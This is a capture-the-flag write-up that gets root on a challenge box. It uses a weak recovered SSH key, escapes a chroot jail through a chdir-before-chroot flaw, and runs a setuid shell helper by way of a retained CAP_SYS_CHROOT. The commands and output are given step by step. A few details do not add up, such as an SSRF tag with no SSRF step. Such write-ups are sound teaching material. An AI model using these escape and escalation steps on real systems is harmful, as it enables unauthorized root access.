# KPMG CTF — "Locks of Confusion - 2" Writeup

**Challenge:** Locks of Confusion - 2 (20 pts — SSRF/Web → SSH/Privesc)
**Targets:**
- SSH: `0.cloud.chals.io:18604` (OpenSSH 9.2p1, Debian)
- "agentd" service: `0.cloud.chals.io:26636` (a decoy)
**Result:** `KPMG_CTF{czJY_4n20_2NmVtHxXsUS_p5xEvKpJ01KpsO9yhJ1UaA}` (root.txt)

---

## TL;DR

The challenge continues the *Locks of Confusion* story: the old **Debian-weak
SSH key recovered in challenge 1** (`privkey_0137.pem`) is exactly what logs
into the "migrated" database replica on `0.cloud.chals.io:18604`. Inside, the
user is dropped into a **restricted busybox jail**. The jail is escapable
because the helper binary (`jail_shell`) calls `chdir` **before** `chroot`, so
the working directory walks out past the chroot boundary. From the real root a
**setuid-root** helper, `/usr/local/bin/diag-recovery`, is found: it runs
`setgid(0); setuid(0); execl("/bin/sh")`. Because the session keeps
`CAP_SYS_CHROOT`, `chroot` into the real root makes the ELF interpreter
resolvable, so the SUID binary yields a root shell and `/root/root.txt`.

The second port (`26636`) is a gimmick — `monitor_agent.py` (a socketserver on
port 8813) answers a banner and one status line, explicitly documented as
"there is nothing to exploit here".

---

## 1. Service fingerprinting

```
$ echo | nc 0.cloud.chals.io 18604
SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10
Invalid SSH identification string.

$ echo | nc 0.cloud.chals.io 26636
agentd/1.9 (collector) ready
OK last-checkin=just-now queue=0
```

- **18604** — an SSH server.
- **26636** — a generic "agentd collector" that answers one banner + one status
  line and closes.

### 1.1 SSH login with the challenge-1 weak key

The whole point of challenge 1 was recovering the weak key
(`privkey_0137.pem`). It works here directly:

```bash
$ ssh -i privkey_0137.pem -p 18604 svc-legacydb@0.cloud.chals.io
uid=1500 gid=1500
$ ls
README
$ head README
diagnostics sandbox -- restricted shell
```

We are **uid 1500 (`svc-legacydb`)** and `PasswordAuthentication no` +
`AllowUsers svc-legacydb` — pubkey only, so this key is the door.

---

## 2. Shell is a restricted busybox jail

The login shell is `/usr/local/bin/jail_shell` (from `/etc/passwd`). The
environment is a minimal busybox jail:

```
$ ls /
/bin  /tmp
$ /bin/busybox --list        # full busybox applet set
```

There is no `/proc`, no `/etc`, no `/dev`, `getcwd` fails, and a bare
`busybox` is not on `PATH` (must use `/bin/busybox`).

### 2.1 The jail-escape: `chdir` before `chroot`

`jail_shell` is a C binary (`libcap`, not stripped). Its embedded strings
explain exactly what it does:

```
$ strings /usr/local/bin/jail_shell | grep -E "/opt|chroot|chdir|setuid|execl|PATH="
/opt/diagnostics/landing
chdir(landing)
/opt/jail
chroot
setgid
setuid
PATH=/nonexistent
execl
```

i.e. it roughly does:

```c
chdir("/opt/diagnostics/landing");
chroot("/opt/jail");      /* <-- root moves under us, but cwd stays OUTSIDE */
setgid(1500); setuid(1500);
execl("/bin/sh", "-sh", NULL);
```

Because the **current working directory is set before the chroot**, the cwd
still points at `/opt/diagnostics/landing`, which is *outside* the new root.
The kernel resolves relative path walks from the actual directory entry, not
the chroot boundary — so `..` climbs out:

```sh
$ pwd                    # getcwd fails (outside visible root)
$ ls ..                  # -> landing
$ ls ../..               # -> the real root: decoy diagnostics jail watcher
```

Climbing one more level gives the complete container root (`.dockerenv`,
`etc`, `home`, `proc`, `root`, `usr`, `var`, `entrypoint.sh`, …).

> This is the classic "chroot escape via retained cwd outside the jail".

---

## 3. Recon of the escape

```
$ ls ../..
decoy/  diagnostics/  jail/  watcher/

/opt/decoy/monitor_agent.py   # -> the "agentd" on 26636/8813 (decoy!)
/opt/diagnostics/landing/README
/opt/jail/                    # our chroot (bin + tmp)
/opt/watcher/watcher.py       # -> fail2ban-like root daemon
```

`monitor_agent.py` confirms the second port is a planted decoy:

```python
"""Stub of an old internal monitoring-agent listener. Answers a banner and a
couple of harmless status lines, then closes. Present on the box as a
believable-but-irrelevant extra service -- there is nothing to exploit here."""
```

The **watcher** is more interesting — it runs as **root** (PID 87):

```python
# /opt/watcher/watcher.py  (CONFIG)
THRESHOLD = 100
FAIL_PUBKEY_LIMIT = 3
BAN_COOLDOWN = 20
def react(ip, username, score):
    print(f"[watcher] threshold reached ip={ip} ...")
    write_incident(ip, username, score)
    ban_ip(ip)                       # iptables -A INPUT -s <ip> -j DROP
```

It tails `/var/log/auth.log`, scores per-IP SSH failures (scanner usernames
+30, rate +10, failed pubkey +20, bait user `backup-admin` +50) and bans
attackers for 20s. A defensive decoy nobody asked for.

### 3.1 The real objective — `entrypoint.sh`

```sh
if [ -z "$FLAG" ]; then FLAG='CTF{root_flag_placeholder}'; fi
echo "$FLAG" > /root/root.txt
chmod 600 /root/root.txt
chmod 700 /root
```

The **root flag lives at `/root/root.txt`** (mode 600 root). We need root.

---

## 4. Privilege escalation

### 4.1 Finding the SUID helper

```
$ ls -la /usr/local/bin
-rwsr-xr-x 1 root root 16072 Oct 8 00:06 diag-recovery
-rwsr-xr-x 1 root root  ...    Oct 8 00:06 jail_shell

$ file /usr/local/bin/diag-recovery
ELF 64-bit LSB pie executable ... interpreter /lib64/ld-linux-x86-64.so.2
```

`diag-recovery` is **setuid root**. Disassembly of `main` (locally):

```asm
0000000000001070 <main>:
    1074:  xor  edi,edi
    1076:  call setgid@plt        ; setgid(0)
    107d:  call setuid@plt        ; setuid(0)
    1084:  lea  rsi, [rip+0xf7e]  ; arg0 = "/bin/sh"
    108d:  lea  rdi, [rip+0xf70]  ; "/bin/sh"
    1094:  call execl@plt         ; execl("/bin/sh", "/bin/sh", NULL)
```

It's a "diagnostics recovery" helper: **drop to root and spawn a shell**.

### 4.2 Why it didn't run immediately — the ELF interpreter

Trying to run the binary from inside the jail fails:

```
$ /usr/local/bin/diag-recovery
sh: /usr/local/bin/diag-recovery: not found
```

The jail has no `/lib64/ld-linux-x86-64.so.2`, and execve resolves the ELF
interpreter against the **process root** (the jail), not the escaped cwd.

### 4.3 `CAP_SYS_CHROOT` — jail ourselves out properly

Our session kept one capability after `jail_shell` dropped privileges:

```
$ grep Cap /proc/self/status
CapEff: 0000000000040000        # bit 18 = CAP_SYS_CHROOT
```

With `CAP_SYS_CHROOT`, `busybox chroot <dir>` works as non-root. We chroot
into the *real* root (the escaped cwd `.`), so the ELF interpreter and all
libraries are found again — and then exec the SUID binary **directly** as the
chroot command (no intermediate shell to mangle privileges):

```bash
$ cd ../../..                                   # real root
$ /bin/busybox chroot . /usr/local/bin/diag-recovery
uid=0(root) gid=0(root) groups=0(root)          # <-- the root shell
$ cat /root/root.txt
KPMG_CTF{czJY_4n20_2NmVtHxXsUS_p5xEvKpJ01KpsO9yhJ1UaA}
```

Root flag captured.

---

## 5. Flag

```
KPMG_CTF{czJY_4n20_2NmVtHxXsUS_p5xEvKpJ01KpsO9yhJ1UaA}   (root.txt)
```

---

## 6. Chain summary

| Step | Technique |
|---|---|
| 1 | Recover Debian-weak SSH key in challenge 1 (`privkey_0137.pem`) |
| 2 | `ssh -i privkey_0137.pem svc-legacydb@0.cloud.chals.io -p 18604` |
| 3 | Find minimal busybox jail + `jail_shell` (`chdir` before `chroot`) |
| 4 | Escape jail via `cd ..` — cwd sits outside the chroot boundary |
| 5 | Read `watcher.py`, `monitor_agent.py` (decoy), `entrypoint.sh` (flag loc) |
| 6 | Spot setuid-root `diag-recovery` (setuid(0) + `/bin/sh`) |
| 7 | Use retained `CAP_SYS_CHROOT` to `chroot` into the real root and execute the SUID binary with a resolvable interpreter |
| 8 | `cat /root/root.txt` → root flag |

The "reactive defense" was a red herring designed to ban scanners; the real
weaknesses are the un-rotated 2007 key, the sloppy jail (`chdir` before
`chroot`), the pointless SUID helper, and the retained chroot capability after
dropping uid.

---

## 7. Artifacts

| Artifact | Location |
|---|---|
| Weak SSH key (from ch1) | `evidence/privkey_0137.pem` |
| Root flag | `evidence/root.txt` |
| `jail_shell` binary (chdir/chroot bug) | `evidence/jail_shell` |
| `diag-recovery` SUID binary | `evidence/diag-recovery` |
| `diag-recovery` disassembly + strings | `evidence/diag_recovery_analysis.txt` |
| Watcher source (root daemon) | `evidence/watcher.py` |
| Entrypoint (flag placement) | `evidence/entrypoint.sh` |
| Landing README + sshd_config | `evidence/readmes_and_sshd.txt` |